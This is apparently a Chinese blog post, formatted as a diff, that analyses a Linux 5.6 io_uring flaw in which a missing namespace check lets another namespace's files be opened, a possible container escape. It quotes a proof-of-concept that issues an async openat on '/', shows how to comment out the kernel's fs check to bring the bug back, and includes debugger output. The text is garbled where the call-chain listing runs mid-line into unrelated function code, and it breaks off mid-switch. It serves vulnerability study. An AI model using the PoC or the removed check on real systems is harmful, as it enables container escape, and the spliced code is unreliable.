@@ -1,0 +1,181 @@
+# Linux "io_uring" namespace 的一个问题
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+看了jannh的[report](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011), 有点迷迷糊糊的，于是跟着分析了一波。之前也分析过 io_uring
+一个权限问题，io_uring代码还在频繁的更新，期间肯定会出现各种各样的安全问题，要找个时间研究一波hh.
+## 环境配置
+以下所有的分析都是在 ubuntu 18.04
+虚拟机下，使用的是[linux-5.6](https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.6.tar.xz)
+版本的内核，可以在[github](https://github.com/rtfingc/cve-repo/tree/master/0x02-p0-issue-2011-io_uring_namespace)上找到我的环境
+## 漏洞分析
+这个洞其实就是没有做好namespace的检查，最后导致可以读取其他namespace的文件，这放到容器里那就是逃逸了。这里从代码的层面看看究竟发生了什么。
+###  poc
+可以在[这里](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011)
+找到jannh 的poc,
+    int main(void) {
+      // initialize uring
+      struct io_uring_params params = { };
+      int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &params));
+      unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
+      unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
+      struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));
+      // execute openat via uring
+      sqes[0] = (struct io_uring_sqe) {
+        .opcode = IORING_OP_OPENAT,
+        .flags = IOSQE_ASYNC,
+        .fd = open("/", O_RDONLY),
+        .addr = (unsigned long)"/",
+        .open_flags = O_PATH | O_DIRECTORY
+      };
+       ((int*)(sq_ring + params.sq_off.array))[0] = 0;
+      (*(int*)(sq_ring + params.sq_off.tail))++;
+      int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
+主要看传入的 `sqes` 部分， 传入的opcode是`IORING_OP_OPENAT`, `IOSQE_ASYNC`
+表示用异步的方式，打开的是`"/"` 目录
+因为这里使用的内核是已经打上了补丁了，为了测试漏洞，我们需要手动patch一下，找到`fs/io_uring.c` 文件, 按照下面把对 fs的检查注释掉。
+    static inline void io_req_work_grab_env(struct io_kiocb *req,    
+                        const struct io_op_def *def)                 
+    {                                                                
+        if (!req->work.mm && def->needs_mm) {                        
+            mmgrab(current->mm);                                     
+            req->work.mm = current->mm;                              
+        }                                                            
+        if (!req->work.creds)                                        
+            req->work.creds = get_current_cred();                    
+        /*if (!req->work.fs && def->needs_fs) {*/                    
+            /*spin_lock(&current->fs->lock);*/                       
+            /*if (!current->fs->in_exec) {*/                         
+                /*req->work.fs = current->fs;*/                      
+                /*req->work.fs->users++;*/                           
+            /*} else {*/                                             
+                /*req->work.flags |= IO_WQ_WORK_CANCEL;*/            
+            /*}*/                                                    
+            /*spin_unlock(&current->fs->lock);*/                     
+        /*}*/                                                        
+        if (!req->work.task_pid)                                     
+            req->work.task_pid = task_pid_vnr(current);              
+    }                                                                
+    static inline void io_req_work_drop_env(struct io_kiocb *req)     
+    {                                                                 
+        if (req->work.mm) {                                           
+            mmdrop(req->work.mm);                                     
+            req->work.mm = NULL;                                      
+        }                                                             
+        if (req->work.creds) {                                        
+            put_cred(req->work.creds);                                
+            req->work.creds = NULL;                                   
+        }                                                             
+        /*if (req->work.fs) {*/                                       
+            /*struct fs_struct *fs = req->work.fs;*/                  
+            /*spin_lock(&req->work.fs->lock);*/                       
+            /*if (--fs->users)*/                                      
+                /*fs = NULL;*/                                        
+            /*spin_unlock(&req->work.fs->lock);*/                     
+            /*if (fs)*/                                               
+                /*free_fs_struct(fs);*/                               
+        /*}*/                                                         
+    }
+###  代码分析
+`SYS_io_uring_enter` 之后的调用链如下
+    __do_sys_io_uring_enter
+        - io_submit_sqes
+            - io_submit_sqe
+                - io_queue_sqe
+                    - io_req_defer_prep //ioprio || sqe->buf_index)                                              
+            return -EINVAL;                                                             
+        if (sqe->flags & IOSQE_FIXED_FILE)                                              
+            return -EBADF;                                                              
+        if (req->flags & REQ_F_NEED_CLEANUP)                                            
+            return 0;                                                                   
+        req->open.dfd = READ_ONCE(sqe->fd);                                             
+        req->open.how.mode = READ_ONCE(sqe->len);                                       
+        fname = u64_to_user_ptr(READ_ONCE(sqe->addr));                                  
+        req->open.how.flags = READ_ONCE(sqe->open_flags);                               
+        req->open.filename = getname(fname);                                            
+        if (IS_ERR(req->open.filename)) {                                               
+            ret = PTR_ERR(req->open.filename);                                          
+            req->open.filename = NULL;                                                  
+            return ret;                                                                 
+        }                                                                               
+        req->open.nofile = rlimit(RLIMIT_NOFILE);                                       
+        req->flags |= REQ_F_NEED_CLEANUP;                                               
+        return 0;                                                                       
+    }
+`io_queue_async_work` 把`req->work` 加入到 work queue, 之后会启动一个内核线程来执行这个work
+    static inline void io_queue_async_work(struct io_kiocb *req)          
+    {                                                                     
+        struct io_ring_ctx *ctx = req->ctx;                               
+        struct io_kiocb *link;                                            
+        bool do_hashed;                                                   
+        do_hashed = io_prep_async_work(req, &link);                       
+        trace_io_uring_queue_async_work(ctx, do_hashed, req, &req->work,  
+                        req->flags);                                      
+        if (!do_hashed) {                                                 
+            io_wq_enqueue(ctx->io_wq, &req->work);                        
+        } else {                                                          
+            io_wq_enqueue_hashed(ctx->io_wq, &req->work,                  
+                        file_inode(req->file));                           
+        }                                                                 
+        if (link)                                                         
+            io_queue_linked_timeout(link);                                
+    }
+实际调试看看，在[`fs/io_uring.c:912`](https://elixir.bootlin.com/linux/v5.6/source/fs/io_uring.c#L912)
+处下个断点
+    gef➤  info args
+    req = 0xffff88800d042c00
+    sqe = 0xffff88800d0c8000
+    gef➤  p *req
+    $1 = {
+      {
+        file = 0xffff88800eec4800,
+    //....
+    open = {
+      file = 0xffff88800eec4800,
+      dfd = 0x0,
+      {
+        mask = 0x0
+      },
+      filename = 0x0 ,
+      buffer = 0x0 ,
+      how = {
+        flags = 0x0,
+        mode = 0x0,
+        resolve = 0x0
+      },
+      nofile = 0x0
+    },
+    //..
+      work = {
+        {
+          list = {
+            next = 0x0 
+          },
+          data = 0x0 
+        },
+        func = 0xffffffff81354760 ,// ,
+        creds = 0x0 ,
+        fs = 0x0 ,
+        flags = 0x0,
+        task_pid = 0x0
+      }
+    }
+在work字段里对应的是`io_wq_submit_work` 函数，进入到这个函数，已经是内核线程了，我们可以下个断点看看
+    gef➤  bt
+    #0  io_wq_submit_work (workptr=0xffffc90000277e88) at fs/io_uring.c:4522
+    #1  0xffffffff81356bba in io_worker_handle_work (worker=0xffff88800e08df00) at fs/io-wq.c:511
+    #2  0xffffffff81357679 in io_wqe_worker (data=0xffff88800e08df00) at fs/io-wq.c:552
+    #3  0xffffffff810c0fe1 in kthread (_create=0xffff88800d066b00) at kernel/kthread.c:255
+    #4  0xffffffff81c00215 in ret_from_fork () at arch/x86/entry/entry_64.S:352
+    #5  0x0000000000000000 in ?? ()
+    gef➤  kcurrent
+    smp system (__per_cpu_offset) 0xffffffff8245c920
+    cpu_num 0x1
+    swapper_pgd 0x0
+    cpu #0 : 0xffff88800f200000
+        current_task: 0xffff88800eee1600  :io_wqe_worker-0
+            uid: 0x0   gid: 0x0  :cred 0xffff88800eec2540
+            mm: 0x0
+            pgd: 0x0
+最后会进入`io_issue_sqe`函数，然后根据传进来的opcode做switch, 在内核线程里调用`io_openat`。
+        case IORING_OP_OPENAT:                           
